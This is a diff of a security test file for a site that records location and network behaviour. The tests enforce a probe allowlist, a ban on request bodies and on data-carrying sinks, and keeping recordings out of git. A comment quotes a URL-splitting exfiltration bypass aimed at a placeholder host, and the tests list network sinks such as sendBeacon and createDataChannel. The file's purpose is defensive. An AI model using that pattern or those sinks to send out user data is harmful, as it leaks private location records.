@@ -1,7 +1,6 @@
-// Security tests. This is a static site that records a person's location and network
-// behaviour for forty minutes at a time, so the properties worth guarding are: it talks to
-// nothing but its seven probes, it has no way to upload what it records, it executes no
-// dynamic code, and it ships no third-party code at all.
+// Security tests. The site records a person's location and network behaviour, so the
+// properties enforced here are: it contacts nothing but its seven probes, it has no way to
+// upload what it records, it executes no dynamic code, and it ships no third-party code.
 import assert from 'node:assert';
 import {readFileSync, readdirSync} from 'node:fs';
 import {execFileSync} from 'node:child_process';
@@ -47,11 +46,9 @@ s.test('no outbound origin exists outside the declared probe allowlist', () => {
   assert.ok(found.size > 0, 'the allowlist check actually inspected something');
 });
 
-// Scanning for forbidden URL literals only catches an exfiltration path written in the
-// clear. `fetch('https:' + '//elsewhere/?d=' + data)` and a protocol-relative `//elsewhere`
-// both walk straight through it. Enumerating the call sites instead makes the check
-// exhaustive: there is one way to reach the network from this application, and it is
-// reviewable in a single expression.
+// A scan for forbidden URL literals passes `fetch('https:' + '//elsewhere/?d=' + data)` and
+// protocol-relative `//elsewhere`. Enumerating the call sites is exhaustive instead: the
+// application reaches the network from one expression.
 s.test('the network can be reached from exactly one place, with a URL it did not invent', () => {
   const calls = [];
   for (const [file, src] of sources) {
@@ -82,8 +79,8 @@ s.test('the network can be reached from exactly one place, with a URL it did not
 
 s.test('no request can carry a body, so nothing recorded can leave the device', () => {
   for (const [file, src] of sources) {
-    // Shorthand properties: `{method, body}` says the same thing as `method: 'POST'` and
-    // used to pass unnoticed, so the identifiers are banned outright.
+    // The bare identifiers are banned too: the shorthand `{method, body}` carries the same
+    // meaning as `method: 'POST'`.
     assert.ok(!/method:\s*['"](POST|PUT|PATCH)['"]/i.test(src), `${file} issues a write request`);
     assert.ok(!/\bbody\s*[:,}]/.test(src.replace(/res\.body|\.body\b/g, '')),
               `${file} attaches a request body`);
@@ -93,18 +90,16 @@ s.test('no request can carry a body, so nothing recorded can leave the device', 
   }
 });
 
-// A request does not have to be a fetch. An image, a stylesheet or a preload hint carries a
-// URL to a third party just as well, and CSP is the only thing that would stop them at
-// runtime — which is not a reason for the source to contain one.
+// An image, a stylesheet or a preload hint carries a URL to a third party without a fetch.
+// At runtime only CSP stops those; this keeps them out of the source.
 s.test('no other tag or API can be used to carry a URL off the device', () => {
   for (const [file, src] of sources) {
     for (const sink of ['new Image', 'new Audio', 'importScripts', 'navigator.sendBeacon',
                         'XMLHttpRequest']) {
       assert.ok(!src.includes(sink), `${file} uses ${sink}`);
     }
-    // Saving the recording is the one place a URL is put on an element, and it addresses a
-    // blob this code just built. Anything else assigned to src/href/action would be a
-    // request to somewhere, issued without a fetch.
+    // The one URL assigned to an element is the blob built for saving a recording. Anything
+    // else on src/href/action is a request issued without a fetch.
     for (const m of src.matchAll(/\.(src|href|action)\s*=\s*([^;\n]+)/g)) {
       assert.equal(`${file}:${m[1]}=${m[2].trim()}`, `${file}:href=url`,
                    `${file} assigns ${m[1]} = ${m[2].trim()}`);
@@ -120,10 +115,9 @@ s.test('no other tag or API can be used to carry a URL off the device', () => {
   }
 });
 
-// The UDP probe needs a peer connection to gather ICE candidates. Gathering alone cannot
-// carry data: what makes a peer connection able to send anything is a data channel, a
-// track, or a remote description completing the negotiation. Those stay banned, so the
-// capability is admitted without admitting the exfiltration path.
+// The UDP probe needs a peer connection to gather ICE candidates. Gathering alone carries no
+// data: sending requires a data channel, a track, or a remote description completing the
+// negotiation, all of which stay banned.
 s.test('the peer connection can gather candidates and nothing else', () => {
   for (const [file, src] of sources) {
     for (const sink of ['createDataChannel', 'setRemoteDescription', 'addTrack', 'addStream',
@@ -188,15 +182,15 @@ s.test('the content security policy locks down everything it can', () => {
   assert.equal(csp['base-uri'], "'none'");
   assert.equal(csp['form-action'], "'none'");
   // connect-src cannot name the IPv6 probe: the host-source grammar has no syntax for a
-  // bracketed literal, and naming it makes the browser ignore the source and block the
-  // probe. The allowlist above is the enforcement instead.
+  // bracketed literal, and naming it makes the browser ignore the source and block the probe.
+  // The allowlist test above is the enforcement.
   assert.match(csp['connect-src'], /^'self' https:$/);
-  // STUN is not fetched, so connect-src does not gate it; webrtc-src is not a directive
-  // any browser enforces. The allowlist test above is what constrains it.
+  // STUN is not fetched, so connect-src does not gate it, and no browser enforces a
+  // webrtc-src directive. The allowlist test above constrains it.
 });
 
-// A module missing from the precache list loads fine online and takes the whole app down
-// offline — which is the one condition this tool exists to record. grade.js shipped that way.
+// A module missing from the precache list loads online and breaks the app offline, which is
+// the condition recovery depends on.
 s.test('every file the app loads is in the offline shell', () => {
   const sw = read('sw.js');
   const shell = [...sw.matchAll(/'([^']+\.(?:js|css|html|svg|png|webmanifest))'/g)].map(m => m[1]);
@@ -206,7 +200,7 @@ s.test('every file the app loads is in the offline shell', () => {
   for (const f of ['index.html', 'app.css', 'manifest.webmanifest']) {
     assert.ok(shell.includes(f), `${f} is not precached`);
   }
-  // And nothing listed that does not exist, which would fail the install and cache nothing.
+  // A listed file that does not exist fails the install and caches nothing.
   const {existsSync} = require('node:fs');
   for (const f of shell) {
     assert.ok(existsSync(new URL(`../${f}`, import.meta.url)), `${f} is precached but missing`);
@@ -217,7 +211,7 @@ s.test('the service worker never intercepts a probe', () => {
   const sw = read('sw.js');
   assert.match(sw, /url\.origin !== self\.location\.origin/, 'cross-origin requests pass through untouched');
   assert.match(sw, /e\.request\.method !== 'GET'/, 'and so does anything that is not a GET');
-  // The call, not the word: sw.js explains in a comment why it is absent.
+  // Matches the call rather than the word, which appears in a comment in sw.js.
   assert.ok(!/\bskipWaiting\s*\(/.test(sw), 'a new version never takes over a tab mid-session');
 });
 
@@ -228,29 +222,28 @@ s.test('there are no runtime dependencies to trust', () => {
             'no module is imported from outside this repository');
 });
 
-// A recorded journey is a home address, a workplace and a daily timetable. Nothing local
-// may reach a public repository because a filename happened to match a pattern.
+// A recorded journey carries a home address, a workplace and a daily timetable, so .dev is
+// excluded as a directory rather than by filename.
 s.test('nothing under .dev is tracked, and the directory is ignored outright', () => {
   const tracked = execFileSync('git', ['ls-files'], {cwd: root, encoding: 'utf8'})
     .split('\n').filter(Boolean);
   const leaked = tracked.filter(f => f.startsWith('.dev/'));
   assert.deepEqual(leaked, [], `local-only files are tracked: ${leaked.join(', ')}`);
 
-  // The rule must be the directory itself, not a filename pattern that happens to match:
-  // renaming an export would silently remove the protection.
+  // The rule covers the directory, so renaming an export inside it changes nothing.
   const rules = readFileSync(new URL('../.gitignore', import.meta.url), 'utf8')
     .split('\n').map(l => l.trim());
   assert.ok(rules.includes('.dev/'), '.gitignore ignores the directory as a whole');
 
-  // And prove it with git rather than by reading the file: a probe path that does not exist
-  // is still answered by the ignore rules.
+  // Checked through git rather than by reading the file; a path that does not exist is still
+  // answered by the ignore rules.
   const check = execFileSync('git', ['check-ignore', '-v', '.dev/anything/at/all.json'],
                              {cwd: root, encoding: 'utf8'});
   assert.match(check, /\.dev\//, `git ignores anything under it: ${check.trim()}`);
 });
 
-// Fixtures are committed on purpose. They are only safe because the anonymiser stripped
-// them, so the guard has to apply to them by name rather than trust the directory.
+// Fixtures are committed deliberately and are safe only because the anonymiser stripped
+// them, so each is checked by name.
 s.test('every committed fixture has been through the anonymiser', async () => {
   const {assertClean} = await import('../tools/anonymise.mjs');
   const dir = new URL('../tests/fixtures/', import.meta.url);
@@ -266,15 +259,15 @@ s.test('every committed fixture has been through the anonymiser', async () => {
 s.test('no journey recording is tracked anywhere in the tree', () => {
   const tracked = execFileSync('git', ['ls-files'], {cwd: root, encoding: 'utf8'})
     .split('\n').filter(Boolean);
-  // An export is recognisable by its shape, wherever it was put and whatever it was named:
-  // scanning only .json meant a recording saved as .txt or pasted into a note went unseen.
+  // Matched on shape rather than extension: a recording saved as .txt or pasted into a note
+  // carries the same format marker.
   const binary = /\.(png|jpg|jpeg|gif|svg|ico|woff2?|ttf|zip|pdf)$/;
   for (const f of tracked) {
     if (f === 'package.json' || f === 'package-lock.json' || binary.test(f)) continue;
     const text = readFileSync(new URL(`../${f}`, import.meta.url), 'utf8');
     assert.ok(!/"format"\s*:\s*"wts\/(session|bundle)"/.test(text),
               `${f} is a recorded journey and must not be committed`);
-    // Holds for the fixtures too: they keep every measurement and no position at all.
+    // Applies to the fixtures too: they keep every measurement and no position.
     assert.ok(!/"lat"\s*:\s*-?\d/.test(text), `${f} contains coordinates`);
   }
 });
@@ -303,7 +296,7 @@ s.test('the test seam cannot take effect on a deployed origin', () => {
   assert.equal(uses.length, 2, 'it is defined once and consulted once');
 });
 
-// One description, so the repository, the install prompt and the page cannot drift apart.
+// One description, shared by the repository, the install prompt and the page.
 s.test('the description is stated once and matches everywhere', () => {
   const desc = JSON.parse(read('package.json')).description;
   assert.ok(desc && desc.length > 40, 'package.json carries the canonical description');
